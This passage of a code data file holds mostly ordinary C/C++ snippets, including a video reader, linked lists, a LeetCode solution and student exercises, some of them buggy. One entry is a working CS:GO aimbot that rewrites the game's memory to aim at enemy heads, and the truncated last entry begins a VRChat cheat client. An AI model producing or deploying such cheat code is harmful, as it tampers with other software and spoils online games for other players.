0.0, 0.0, 1.0, 0.0, -1.0, 0.0, 1.0, 0.0, 0.0;\n  Eigen::Quaterniond q_b_n = Eigen::Quaterniond(C_b_n);\n  Eigen::Vector3d p_nsTP_n = Eigen::Vector3d(0.0, 0.0, 0.0);\n\n  // Generate a ",
    "#include \"memorie.h\"\r\n#include \"vector.h\"\r\n\r\n#include <thread>\r\n\r\n\r\n\r\nnamespace offset\r\n{\r\n\t// client\r\n\tconstexpr ::std::ptrdiff_t dwLocalPlayer = 0xDA746C;\r\n\tconstexpr ::std::ptrdiff_t dwEntidyList = 0x4DC178;\r\n\r\n\t// engine\r\n\r\n\tconstexpr ::std::ptrdiff_t dwClientState = 0x589FCC;\r\n\tconstexpr ::std::ptrdiff_t dwClientState_ViewAngles = 0x4D90;\r\n\r\n\t// entity\r\n\r\n\tconstexpr ::std::ptrdiff_t m_dwBoneMatrix = 0x26A8;\r\n\tconstexpr ::std::ptrdiff_t m_bDortmant = 0xED;\r\n\tconstexpr ::std::ptrdiff_t m_iTeamNum = 0xF4;\r\n\tconstexpr ::std::ptrdiff_t m_iHealth = 0x100;\r\n\tconstexpr ::std::ptrdiff_t m_vecOrigin = 0x138;\r\n\tconstexpr ::std::ptrdiff_t m_vecViewOffset = 0x108;\r\n\tconstexpr ::std::ptrdiff_t m_aimPunchAngle = 0x303C;\r\n\tconstexpr ::std::ptrdiff_t m_bSpottedByMask = 0x980;\r\n\r\n}\r\n\r\nconstexpr Vector3 CalculateAngle(\r\n\tconst Vector3& localPosition,\r\n\tconst Vector3& enemyPosition,\r\n\tconst Vector3& viewAngles) noexcept\r\n{\r\n\treturn ((enemyPosition - localPosition).ToAngle() - viewAngles);\r\n}\r\n\r\n\r\n\r\n\r\nint main()\r\n{\r\n\r\n\t// initialize memory class\r\n\r\n\tconst auto memory = Memory{ \"csgo.exe\" };\r\n\r\n\t// module addresses\r\n\r\n\tconst auto client = memory.GetModuleAddress(\"client.dll\");\r\n\tconst auto engine = memory.GetModuleAddress(\"engine.dll\");\r\n\r\n\t// infinite hack loop\r\n\twhile (true)\r\n\t{\r\n\t\tstd::this_thread::sleep_for(std::chrono::milliseconds(1));\r\n\r\n\t\t// aimbot key\r\n\t\tif (!GetAsyncKeyState(VK_RBUTTON))\r\n\t\t\tcontinue;\r\n\r\n\t\t// get local player \r\n\t\tconst auto& localPlayer = memory.Read<std::uintptr_t>(client + offset::dwLocalPlayer);\r\n\t\tconst auto& localTeam = memory.Read<std::int32_t>(localPlayer + offset::m_iTeamNum);\r\n\r\n\t\t// eye position = origin + viewOffset\r\n\t\tconst auto localEyePosition = memory.Read<Vector3>(localPlayer + offset::m_vecOrigin) + memory.Read<Vector3>(localPlayer + offset::m_vecViewOffset);\r\n\r\n\t\tconst auto& clientState = memory.Read<std::uintptr_t>(engine + offset::dwClientState);\r\n\r\n\t\tconst auto& viewAngles = memory.Read<Vector3>(clientState + offset::dwClientState_ViewAngles);\r\n\t\tconst auto& aimPunch = memory.Read<Vector3>(localPlayer + offset::m_aimPunchAngle) * 2;\r\n\r\n\t\t// aimbot fov\r\n\r\n\t\tauto bestFov = 5.f;\r\n\t\tauto bestAngle = Vector3{ };\r\n\r\n\t\tfor (auto i = 1; i <= 32; ++i)\r\n\t\t{\r\n\t\t\tconst auto& player = memory.Read<std::uintptr_t>(client + offset::dwEntidyList + i * 0x10);\r\n\r\n\t\t\t// entity checks\r\n\t\t\tif (memory.Read<std::int32_t>(player + offset::m_iTeamNum) == localTeam)\r\n\t\t\t\tcontinue;\r\n\r\n\t\t\tif (memory.Read<bool>(player + offset::m_bDortmant))\r\n\t\t\t\tcontinue;\r\n\r\n\t\t\tif (!memory.Read<std::int32_t>(player + offset::m_iHealth))\r\n\t\t\t\tcontinue;\r\n\r\n\t\t\tif (!memory.Read<bool>(player + offset::m_bSpottedByMask))\r\n\t\t\t\tcontinue;\r\n\r\n\t\t\tconst auto boneMatrix = memory.Read < std::uintptr_t>(player + offset::m_dwBoneMatrix);\r\n\r\n\t\t\t// position of player head in 3d space\r\n\t\t\t\r\n\t\t\tconst auto playerHeadPosition = Vector3{\r\n\t\t\t\tmemory.Read<float>(boneMatrix + 0x30 * 8 + 0x0C),\r\n\t\t\t\tmemory.Read<float>(boneMatrix + 0x30 * 8 + 0x1C),\r\n\t\t\t\tmemory.Read<float>(boneMatrix + 0x30 * 8 + 0x2C)\r\n\t\t\t};\r\n\r\n\t\t\tconst auto angle = CalculateAngle(\r\n\t\t\t\tlocalEyePosition,\r\n\t\t\t\tplayerHeadPosition,\r\n\t\t\t\tviewAngles + aimPunch\r\n\t\t\t);\r\n\r\n\t\t\tconst auto fov = std::hypot(angle.x, angle.y);\r\n\r\n\t\t\tif (fov < bestFov)\r\n\t\t\t{\r\n\t\t\t\tbestFov = fov;\r\n\t\t\t\tbestAngle = angle;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\t// finely the aimbot!\r\n\r\n\t\tif (!bestAngle.IsZero())\r\n\t\t\tmemory.Write<Vector3>(clientState + offset::dwClientState_ViewAngles, viewAngles + bestAngle / 3.f); // <- aimbot smooth 3.f\r\n\r\n\t}\r\n\r\n\treturn 0;\r\n}",
    "#include \"videoreader.h\"\n\nVideoReader::VideoReader()\n{\n}\n\nVideoReader::VideoReader(const std::string &filename)\n{\n    open_video(filename);\n}\n\nVideoReader::~VideoReader()\n{\n    close_video();\n}\n\nbool VideoReader::open_video(const std::string &filename)\n{\n    // \u6253\u5f00\u8f93\u5165\u6587\u4ef6\n    if (avformat_open_input(&ifmt_ctx, filename.c_str(), NULL, NULL) < 0)\n    {\n        error_string << \"Unable to open file: \" << filename << std::endl;\n        return false;\n    }\n\n    // \u8bfb\u53d6\u6d41\u4fe1\u606f\n    if (avformat_find_stream_info(ifmt_ctx, NULL) < 0)\n    {\n        error_string << \"Unable to read stream info: \" << filename << std::endl;\n        close_video();\n        return false;\n    }\n\n    // \u6253\u5370\u683c\u5f0f\u4fe1\u606f\n    av_dump_format(ifmt_ctx, 0, filename.c_str(), 0);\n\n    // \u67e5\u627e\u89c6\u9891\u6d41\u4e0e\u89e3\u7801\u5668\n    video_stream_index = av_find_best_stream(\n        ifmt_ctx,\n        AVMEDIA_TYPE_VIDEO,\n        -1, -1, &codec, 0);\n    if (video_stream_index < 0)\n    {\n        error_string << \"Failed to find a Video steam: \" << filename << std::endl;\n        close_video();\n        return false;\n    }\n    if (!codec)\n    {\n        error_string << \"Failed to find a decoder: \" << filename << std::endl;\n        close_video();\n        return false;\n    }\n\n    // \u521d\u59cb\u5316\u89e3\u7801\u5668\u4e0a\u4e0b\u6587\n    codec_ctx = avcodec_alloc_context3(codec);\n    if (!codec_ctx)\n    {\n        error_string << \"Failed to allocate codec context\" << std::endl;\n        close_video();\n        return false;\n    }\n    AVCodecParameters *codecpar = ifmt_ctx->streams[video_stream_index]->codecpar;\n    // \u5c06\u89e3\u7801\u5668\u53c2\u6570\u62f7\u8d1d\u5230\u89e3\u7801\u5668\u4e0a\u4e0b\u6587\n    if (avcodec_parameters_to_context(codec_ctx, codecpar) < 0)\n    {\n        error_string << \"Failed to copy codec parameters to decoder context\" << std::endl;\n        close_video();\n        return false;\n    }\n\n    if (avcodec_open2(codec_ctx, codec, nullptr) < 0)\n    {\n        error_string << \"Failed to open decodec\" << std::endl;\n        close_video();\n        return false;\n    }\n\n    sws_ctx = sws_getContext(codec_ctx->width, codec_ctx->height,\n                             codec_ctx->pix_fmt,\n                             codec_ctx->width, codec_ctx->height,\n                             AV_PIX_FMT_RGB24,\n                             SWS_BILINEAR, NULL, NULL, NULL);\n\n    if (!sws_ctx)\n    {\n        error_string << \"Failed to initialize the conversion context\" << std::endl;\n        close_video();\n        return false;\n    }\n\n    inframe = av_frame_alloc();\n    if (!inframe)\n    {\n        error_string << \"Could not allocate video frame\" << std::endl;\n        close_video();\n        return false;\n    }\n    is_opened_ = true;\n    return true;\n}\n\nbool VideoReader::read_frame(Frame &frame)\n{\n    int ret = avcodec_receive_frame(codec_ctx, inframe);\n    while (ret == AVERROR(EAGAIN))\n    {\n        if (frame.pkt)\n        {\n            av_packet_unref(frame.pkt);\n        }\n        if (av_read_frame(ifmt_ctx, frame.pkt) < 0)\n        {\n            error_string << \"Failed to read a frame, maybe file meets EOF.\" << std::endl;\n            return false;\n        }\n        if (frame.pkt->stream_index != video_stream_index)\n        {\n            frame.type = FrameType::OTHER;\n            return true;\n        }\n        if (avcodec_send_packet(codec_ctx, frame.pkt) != 0)\n        {\n            error_string << \"Failed to send packet to decoder\" << std::endl;\n            return false;\n        }\n        ret = avcodec_receive_frame(codec_ctx, inframe);\n    }\n    if (ret < 0)\n    {\n        error_string << \"Failed to receive frame from decoder\" << std::endl;\n        return false;\n    }\n    frame.type = FrameType::VIDEO;\n\n    frame.frame_timestamp.pts = inframe->pts;\n    frame.frame_timestamp.pkt_dts = inframe->pkt_dts;\n#if LIBAVUTIL_VERSION_MAJOR < 58  // use different var for low version\n    frame.frame_timestamp.duration = inframe->pkt_duration;\n#else\n    frame.frame_timestamp.duration = inframe->duration;\n#endif\n    frame.stream_index = video_stream_index;\n\n    frame.pkt_timestamp.pts = frame.pkt->pts;\n    frame.pkt_timestamp.dts = frame.pkt->dts;\n    frame.pkt_timestamp.duration = frame.pkt->duration;\n\n    frame.img.create(inframe->width, inframe->height, (size_t)3, 3);\n    uint8_t *indata[1] = {(uint8_t *)frame.img.data};\n    int inlinesize = frame.img.w * 3;\n    sws_scale(sws_ctx, inframe->data, inframe->linesize, 0,\n              inframe->height, indata, &inlinesize);\n    return true;\n}\n\nvoid VideoReader::close_video()\n{\n    if (inframe)\n        av_frame_free(&inframe);\n    if (sws_ctx)\n        sws_freeContext(sws_ctx);\n    if (codec_ctx)\n        avcodec_free_context(&codec_ctx);\n    if (ifmt_ctx)\n        avformat_close_input(&ifmt_ctx);\n    video_stream_index = -1;\n    is_opened_ = false;\n}\n\n",
    "#include<stdio.h>\r\n#include<stdlib.h>\r\n//stacks using linked list//\r\nstruct stack\r\n{\r\nint data;\r\nstruct stack *next;\r\n};\r\nstruct stack *top = NULL;\r\nstruct stack *push(struct stack *, int);\r\nstruct stack *display(struct stack *);\r\nstruct stack *pop(struct stack *);\r\nint main()\r\n{\r\n\tint val;\r\n\tint choice;\r\n\tdo{\r\n\tprintf(\"menu\\n\");\r\n\tprintf(\"1.push data\\n\");\r\n\tprintf(\"2.pop\\n\");\r\n\tprintf(\"3.display\\n\");\r\n\tprintf(\"4.exit\\n\");\r\n\tprintf(\"enter your choice\\n\");\r\n\tscanf(\"%d\",&choice);\r\n\tswitch(choice){\r\n  \tcase 1:\r\nprintf(\"\\n Enter the number to be pushed on stack: \");\r\nscanf(\"%d\", &val);\r\ntop = push(top, val);\r\nbreak;\r\n\r\n       case 2:\r\ntop = pop(top);\r\nbreak;\r\n\r\n       case 3:\r\ntop = display(top);\r\nbreak;\r\n}\r\n\r\n}while(choice != 4);\r\nreturn 0;\t\r\n}\r\nstruct stack *display(struct stack *top)\r\n{\r\n\tif(top==NULL)\r\n\t{\r\n\t\tprintf(\"stack underflow\\n\");\r\n\t}\r\n\tstruct stack *ptr=top;\r\n\tprintf(\"stack=\\n\");\r\n\twhile(ptr->next!=NULL)\r\n\t{\r\n\t\tprintf(\"%d->\",ptr->data);\r\n\t\tptr=ptr->next;\r\n\t}\r\n\tprintf(\"%d\\n\",ptr->data);\r\n\treturn top;\r\n}\r\n\r\nstruct stack *push(struct stack *top, int val)\r\n{\r\n\t\r\n\t\tstruct stack *newnode=(struct stack*)malloc(sizeof(struct stack));\r\n\t\tnewnode->data=val;\r\n\t\tnewnode->next=NULL;\r\n\t\tnewnode->next=top;\r\n\t\ttop=newnode;\r\n\t\t\r\n}\r\n\r\nstruct stack *pop(struct stack *top){\r\n\tif(top==NULL)\r\n\t{\r\n\t\tprintf(\"stack underflow\\n\");\r\n\t}\r\n\tstruct stack *ptr=(struct stack*)malloc(sizeof(struct stack));\r\n\tptr=top;\r\n\ttop=top->next;\r\n\tfree(ptr);\r\n\treturn top;\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"multiplayer\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <cmath>\nusing namespace std;\n\nvoid input_positif(int &var, const string &prompt) {\n    do {\n        cout << prompt;\n        cin >> var;\n        if (var <= 0) {\n            cout << \"\\nMasukkan nilai positif!\\n\";\n        }\n    } while (var <= 0);\n}\n\nvoid luas_persegi() {\n    int sisi;\n    input_positif(sisi, \"\\nMasukkan Panjang Sisi: \");\n    cout << \"\\nLuas Persegi adalah \" << sisi * sisi << endl;\n}\n\nvoid luas_persegi_panjang() {\n    int panjang, tinggi;\n    input_positif(panjang, \"\\nMasukkan Panjang Persegi Panjang: \");\n    input_positif(tinggi, \"Masukkan Tinggi Persegi Panjang: \");\n    cout << \"\\nLuas Persegi Panjang Adalah: \" << panjang * tinggi << endl << endl;\n}\n\nvoid luas_lingkaran() {\n    int radius;\n    const float pi = 3.14159;\n    input_positif(radius, \"\\nMasukkan Radius Lingkaran: \");\n    cout << \"\\nLuas Lingkaran Adalah: \" << pi * radius * radius << endl << endl;\n}\n\nvoid pangkat() {\n    int x, n;\n    cout << \"\\nMasukkan Nilai X: \";\n    cin >> x;\n    cout << \"\\nMasukkan Nilai N: \";\n    cin >> n;\n    cout << \"\\nX pangkat N adalah: \" << pow(x, n) << endl;\n}\n\nvoid average() {\n    int panjang;\n    float total = 0;\n    input_positif(panjang, \"\\nMasukkan Jumlah Angka: \");\n    for (int i = 0; i < panjang; i++) {\n        float tmp;\n        cout << \"\\nMasukkan Angka ke-\" << i + 1 << \": \";\n        cin >> tmp;\n        total += tmp;\n    }\n    cout << \"\\nRata-Rata Angka Adalah: \" << total / panjang << endl;\n}\n\nvoid pilih_operasi(int pilihan) {\n    switch (pilihan) {\n        case 1:\n            luas_persegi();\n            break;\n        case 2:\n            luas_persegi_panjang();\n            break;\n        case 3:\n            luas_lingkaran();\n            break;\n        case 4:\n            pangkat();\n            break;\n        case 5:\n            average();\n            break;\n    }\n}\n\nint main() {\n    const string opsi[] = {\n        \"Luas Persegi\", \n        \"Luas Persegi Panjang\", \n        \"Luas Lingkaran\", \n        \"X pangkat N\", \n        \"Nilai rata-rata dari n-bilangan\"\n    };\n\n    int n;\n    cout << \"Masukkan Operasi yang Ingin Dipilih\" << endl;\n    for (int i = 0; i < 5; ++i) {\n        cout << i + 1 << \". \" << opsi[i] << \"\\n\";\n    }\n\n    do {\n        cout << \"\\nMasukkan Pilihan Operasi: \";\n        cin >> n;\n        if (n < 1 || n > 5) {\n            cout << \"\\nMasukkan Pilihan Operasi dari 1-5!\\n\";\n        }\n    } while (n < 1 || n > 5);\n\n    pilih_operasi(n);\n\n    return 0;\n}\n",
    "// Date: Sat Oct  5 10:18:04 2024\n\n#include <cassert>\n#include <climits>\n#include <cmath>\n#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n\n#include <algorithm>\n#include <array>\n#include <bitset>\n#include <functional>\n#include <iomanip>\n#include <iostream>\n#include <map>\n#include <queue>\n#include <random>\n#include <set>\n#include <sstream>\n#include <stack>\n#include <string>\n#include <utility>\n#include <vector>\n\nusing namespace std;\n\ntypedef long long ll;\ntypedef unsigned long long ull;\ntypedef vector<int> VI;\ntypedef vector<string> VS;\ntypedef pair<int, int> PII;\ntypedef pair<ll, ll> PLL;\ntemplate <class T> using pq = priority_queue<T>;\ntemplate <class T> using pqg = priority_queue<T, vector<T>, greater<T>>;\n\nconst int INF = 0x3f3f3f3f, MOD = 1e9 + 7, MOD1 = 998'244'353;\nconst ll INFL = 0x3f3f3f3f'3f3f3f3f;\nconst double eps = 1e-8;\nconst int dir[8][2] = {\n    {0, 1}, {0, -1}, {1, 0}, {-1, 0}, {1, 1}, {1, -1}, {-1, 1}, {-1, -1},\n};\nmt19937_64 _m_gen64;\n\nconst ull Pr = 131;\n\n#define For(i, a, b) for (int i = int(a); i < int(b); ++i)\n#define Rof(i, a, b) for (int i = int(b) - 1; i >= int(a); --i)\n#define For1(i, a, b) for (int i = int(a); i <= int(b); ++i)\n#define Rof1(i, a, b) for (int i = int(b); i >= int(a); --i)\n#define ForE(i, j) for (int i = h[j]; i != -1; i = ne[i])\n\n#define f1 first\n#define f2 second\n#define pb push_back\n#define has(a, x) (a.find(x) != a.end())\n#define nemp(a) (!a.empty())\n#define all(a) (a).begin(), (a).end()\n#define all1(a, len) (a + 1), (a + 1 + len)\n#define SZ(a) int((a).size())\n#define NL cout << '\\n';\n\ntemplate <class T> bool ckmin(T &a, const T &b) { return b < a ? a = b, 1 : 0; }\ntemplate <class T> bool ckmax(T &a, const T &b) { return a < b ? a = b, 1 : 0; }\n\ntemplate <typename t> istream &operator>>(istream &in, vector<t> &vec) {\n  for (t &x : vec)\n    in >> x;\n  return in;\n}\n\ntemplate <typename t> ostream &operator<<(ostream &out, vector<t> &vec) {\n  int n = SZ(vec);\n  For(i, 0, n) {\n    out << vec[i];\n    if (i < n - 1)\n      out << ' ';\n  }\n  return out;\n}\n\n#ifdef _DEBUG\n#include \"debug.h\"\n#else\n#define dbg(x...)\n#define dbgi(x)\n#define dbgln()\n#define dbgr(x...)\n#endif\n\n// For LeetCode\n#define LN ListNode\n#define LNP ListNode *\n#define TN TreeNode\n#define TNP TreeNode *\n\n#ifdef _DEBUG\nstruct ListNode {\n  int val;\n  ListNode *next;\n  ListNode() : val(0), next(nullptr) {}\n  ListNode(int val) : val(val), next(nullptr) {}\n  ListNode(int val, ListNode *next) : val(val), next(next) {}\n};\n\nstruct TreeNode {\n  int val;\n  TreeNode *left;\n  TreeNode *right;\n  TreeNode() : val(0), left(nullptr), right(nullptr) {}\n  TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}\n  TreeNode(int x, TreeNode *left, TreeNode *right)\n      : val(x), left(left), right(right) {}\n};\n\nvoid PrePrintLCTree(TNP root) {\n  if (!root)\n    return;\n  dbgi(root->val);\n  PrePrintLCTree(root->left);\n  PrePrintLCTree(root->right);\n}\n\nclass LCCodec {\npublic:\n  // Encodes a tree to a single string.\n  string serialize(TreeNode *root) {\n    if (!root)\n      return \"\";\n\n    vector<TNP> a;\n    a.pb(root);\n    string ans;\n\n    while (nemp(a)) {\n      vector<TNP> b;\n\n      string tmp;\n      for (auto x : a) {\n        if (nemp(ans)) {\n          ans += ',';\n        }\n\n        if (x)\n          ans += to_string(x->val);\n        else\n          ans += \"null\";\n      }\n\n      bool ok{false};\n      for (auto x : a) {\n        if (x) {\n          b.pb(x->left);\n          b.pb(x->right);\n\n          if (x->left || x->right) {\n            ok = true;\n          }\n        }\n      }\n\n      if (ok)\n        a = std::move(b);\n      else\n        a = {};\n    }\n\n    return ans;\n  }\n\n  // Decodes your encoded data to tree.\n  TreeNode *deserialize(string data) {\n    vector<TNP> a;\n    int n = SZ(data);\n    vector<string> b;\n\n    if (!n)\n      return nullptr;\n\n    string t;\n    for (auto x : data) {\n      if (x == ',') {\n        b.pb(t);\n        t = \"\";\n      } else\n        t += x;\n    }\n    b.pb(t);\n\n    for (auto x : b) {\n      if (x == \"null\")\n        a.pb(nullptr);\n      else\n        a.pb(new TN(stoi(x)));\n    }\n\n    int m = SZ(a);\n    int i = 0, j = 1;\n\n    while (i < m) {\n      while (i < m && !a[i])\n        ++i;\n      if (i >= n)\n        break;\n\n      if (j < m)\n        a[i]->left = a[j++];\n      if (j < m)\n        a[i]->right = a[j++];\n      ++i;\n    }\n\n    return a[0];\n  }\n};\n\n#endif\n// End of LeetCode\n\nclass Solution {\npublic:\n  int maximumProduct(vector<int> &a, int k) {\n    pqg<ll> q;\n    ll ans{1};\n\n    for (auto x : a)\n      q.push(x);\n\n    while (k--) {\n      auto x = q.top();\n      q.pop();\n      q.push(x + 1);\n    }\n\n    while (nemp(q)) {\n      auto x = q.top();\n      q.pop();\n      ans = ans * x % MOD;\n    }\n\n    return ans;\n  }\n};\n\n#ifdef _DEBUG\n\nint main(void) {\n  std::ios::sync_with_stdio(false);\n  cin.tie(NULL);\n  cout.tie(NULL);\n  _m_gen64.seed(Pr);\n\n  Solution a;\n\n  return 0;\n}\n\n#endif\n",
    "#include <iostream>\nusing namespace std;\n\nstruct Node{\n    int data; //Entero que almacena el valor del nodo\n    Node* next; //Un puntero al siguiente nodo\n};\nclass LinkedList{\n    private:\n    Node *head;\n    public:\n    LinkedList(){ //Constructor para inicializar la cabeza\n        head = nullptr;\n    }\n    void addNode(Node* &head, int value){ //\"Head\" identificar la cabeza actual del nodo\n     Node* newNode = new Node(); //Crear un nuevo Nodo din\u00e1micamente en memoria\n     //*newNode.data = value\n     newNode -> data = value; //Asignaci\u00f3n del valor pasado a la funci\u00f3n (value) al campo data del nuevo nodo\n     newNode -> next = nullptr; //El siguiente nodo es un nullptr\n     if(head == nullptr){\n        head = newNode; // Si la lista est\u00e1 vac\u00eda el nuevo nodo es la head\n     }else{\n        Node* temp = head; //Crear una variable temporal que almacene el current head\n        //Recorrer toda la lista para a\u00f1adir un nuevo valor y se detiene hasta encontrar el \u00faltimo nodo\n        while(temp -> next != nullptr){ \n            temp = temp -> next; //Avanza al siguiente nodo de la lista \n\n        }\n        temp -> next = newNode; //Enlaza el \u00faltimo nodo de la lista al nuevo nodo\n     }\n\n}\n\nvoid removeNode(Node *&head, int value){\n    if(head == nullptr){\n        cout << \"La lista est\u00e1 vac\u00eda\" <<endl;\n        return;\n    }\n    Node *temp = head;\n    Node *prev = nullptr;\n\n    while(temp != nullptr && temp->data != value){\n        prev = temp;\n        temp = temp->next;\n    }\n    //Si no se encuentra el nodo\n    if(temp == nullptr){\n        cout << \"Nodo con valor \" << value << \"no encontrado\" <<endl;\n        return;\n    }\n    //Si el nodo a eliminar es la cabeza\n    if(prev == nullptr){\n        head = temp ->next;\n    }else{\n        prev->next = temp->next;\n    }\n    delete temp;\n    cout << \"\\nNodo con valor \" <<value<< \" eliminado\"<<endl;\n\n\n\n};\nNode* searchNode(Node *&head, int value){\n    Node *temp = head;\n    while(temp != nullptr){\n        if(temp->data == value){ //Si encuentra el valor retorna el nodo\n            return temp;\n        }\n        temp = temp->next; //Avanza al siguiente nodo\n\n    }\n    return nullptr; //Retorna nullptr si no encuentra el valor\n\n}\nvoid showList(Node* head){\n    Node* temp = head;\n    while(temp != nullptr){ //Recorre la lista hasta que no haya m\u00e1s nodos\n        cout << temp -> data << \"-> \"; //Muestra el valor almacenado en el nodo actual\n        temp = temp -> next; //Avanza al siguiente nodo en la lista\n    }\n\n}\n\n\n};\n\nint main(){\n    Node* list = nullptr;\n    LinkedList linkedlist;\n    linkedlist.addNode(list, 40);\n    linkedlist.addNode(list, 50);\n    linkedlist.addNode(list, 100);\n\n    cout << \"\\nLista de valores: \"<<endl;\n    linkedlist.showList(list);\n\n    linkedlist.removeNode(list, 50);\n    cout << \"Lista de valores: \"<<endl;\n    linkedlist.showList(list);\n\n    int searchValue = 100;\n    Node *foundNode = linkedlist.searchNode(list, searchValue);\n\n    if(foundNode != nullptr){\n        cout << \"\\nNodo con valor \" << searchValue << \" encontrado.\" << endl <<endl;\n    }else{\n        cout << \"\\nNodo con valor \" << searchValue << \" no encontrado.\" << endl<<endl;\n    }\n\n\n}",
    "#include \"Student.h\"\n#include <iostream>\n#include <iomanip>\nusing namespace std;\nStudent::Student() : idNumber(0), tests(nullptr), average(0.0), grade('F') {}\nStudent::~Student()\n{\n\tdelete[] tests;\n}\nStudent* Student::allocateArray(int& numStudents, int& numTests)\n{\n\tdo {\n\t\tcout << \"Enter number of students: \";\n\t\tcin >> numStudents;\n\t\tif (numStudents <= 0) {\n\t\t\tcout << \"Invalid input. Must be greater than 0.\\n\";\n\t\t}\n\t} while (numStudents <= 0);\n\tdo {\n\t\tcout << \"Enter number of tests per student: \";\n\t\tcin >> numTests;\n\t\tif (numTests <= 0) {\n\t\t\tcout << \"Invalid input. Must be greater than 0.\\n\";\n\t\t}\n\t} while (numTests <= 0);\n\treturn new Student[numStudents];\n}\nvoid Student::getInput(int numStudents, int numTests)\n{\n\tfor (int i = 0; i < numStudents; ++i) {\n\t\tcout << \"Enter details for student \" << i + 1 << \":\\n\";\n\t\tcout << \"Name: \";\n\t\tcin >> name;\n\n\t\tdo {\n\t\t\tcout << \"ID Number: \";\n\t\t\tcin >> idNumber;\n\t\t\tif (idNumber <= 0) {\n\t\t\t\tcout << \"Invalid ID. Must be positive.\\n\";\n\t\t\t}\n\t\t} while (idNumber <= 0);\n\n\t\ttests = new int[numTests];\n\t\tfor (int j = 0; j < numTests; ++j) {\n\t\t\tdo {\n\t\t\t\tcout << \"Test \" << j + 1 << \" score: \";\n\t\t\t\tcin >> tests[j];\n\t\t\t\tif (tests[j] < 0 || tests[j] > 100) {\n\t\t\t\t\tcout << \"Invalid score. Enter a number between 0 and 100.\\n\";\n\t\t\t\t}\n\t\t\t} while (tests[j] < 0 || tests[j] > 100);\n\t\t}\n\t}\n\tcalcAvgAndGrade(numStudents, numTests);\n}\nvoid Student::calcAvgAndGrade(int numStudents, int numTests)\n{\n\tint total = 0;\n\tfor (int j = 0; j < numTests; ++j)\n\t{\n\t\ttotal += tests[j];\n\t}\n\taverage = static_cast<double>(total) / numTests;\n\n\tif (average >= 90)\n\t\tgrade = 'A';\n\telse if (average >= 80)\n\t\tgrade = 'B';\n\telse if (average >= 70)\n\t\tgrade = 'C';\n\telse if (average >= 60)\n\t\tgrade = 'D';\n\telse if (average >= 50)\n\t\tgrade = 'E';\n\telse\n\t\tgrade = 'F';\n}\nvoid Student::displayOneStudent(int numTests) const\n{\n\tcout << \"\\nName: \" << name\n\t\t<< \"\\nID Number: \" << idNumber\n\t\t<< \"\\nTest Scores: \";\n\tfor (int j = 0; j < numTests; ++j)\n\t{\n\t\tcout << tests[j] << \" \";\n\t}\n\tcout << \"\\nAverage Score: \" << fixed << setprecision(2) << average\n\t\t<< \"\\nGrade: \" << grade << \"\\n\";\n}\nint Student::getStudentCount(int numStudents, char grade) const\n{\n\tint count = 0;\n\tfor (int i = 0; i < numStudents; ++i) {\n\t\tif (this->grade == grade) {\n\t\t\tcount++;\n\t\t}\n\t}\n\treturn count;\n}\nStudent* Student::getBestStudent(int numStudents) {\n\tStudent* bestStudent = this;\n\tfor (int i = 1; i < numStudents; ++i) {\n\t\tif (this->average > bestStudent->average) {\n\t\t\tbestStudent = this;\n\t\t}\n\t}\n\treturn bestStudent;\n}\n\nvoid Student::displayStudents(int numStudents, int numTests) const\n{\n\tfor (int i = 0; i < numStudents; ++i) {\n\t\tcout << \"\\nDetails of student \" << i + 1 << \":\";\n\t\tdisplayOneStudent(numTests);\n\t}\n}\nvoid Student::displayBestStudent(int numStudents, int numTests)\n{\n\tStudent* best = getBestStudent(numStudents);\n\tcout << \"\\nBest student details:\";\n\tbest->displayOneStudent(numTests);\n}\n//void Student::deallocateArray(int numStudents,int numTests)\n//{\n//    delete[] tests;\n//}\n\nvoid Student::deallocateArray(int numStudents, int numTests)\n{\n\tfor (int i = 0; i < numStudents; i++)\n\t{\n\t\tdelete[] tests;\n\t}\n\tdelete[] tests;\n}\n\n",
    "#include \"ESP.hpp\"\n#include \"../imgui_helper.hpp\"\n#include \"../imgui_custom.hpp\"\n#include \"../Menu.hpp\"\n#include \"SetManager.hpp\"\n#include <Windows.h>\n#include <Globals.hpp>\n\nnamespace UserInterfaceController {\n\tUnity::CGameObject* GetMMAvatarPreview();\n}\n\nnamespace Functions_t {\n\tnamespace Game {\n\t\tvoid KeyboardShit();\n\n\t\tvoid SendNoti(std::string text, float time);\n\n\t\tnamespace VRChatSDKBasePlayerAPI {\n\t\t\tvoid TakeOwnership(VRC_SDKBase_VRCPlayerApi_o* Plr, UnityEngine_GameObject_o* Obj);\n\t\t\tvoid TakeOwnership(VRC_SDKBase_VRCPlayerApi_o* Plr, Unity::CGameObject* Obj);\n\t\t}\n\t\tnamespace VRChatSDKBaseNetworking {\n\t\t\tvoid SetOwner(VRC_SDKBase_VRCPlayerApi_o* Plr, UnityEngine_GameObject_o* Obj);\n\t\t\tvoid SetOwner(VRC_SDKBase_VRCPlayerApi_o* Plr, Unity::CGameObject* Obj);\n\t\t\tvoid RPC(int32_t targetClients, Unity::CGameObject* targetObject, Unity::System_String* methodName, System_Object_array* parameters);\n\t\t\tint32_t GetServerTimeInMilliseconds();\n\t\t}\n\n\t\tnamespace System {\n\t\t\tSystem_Byte_array* FromBase64String(Unity::System_String* s);\n\t\t\tvoid BlockCopy(System_Array_o* src, int32_t srcOffset, System_Array_o* 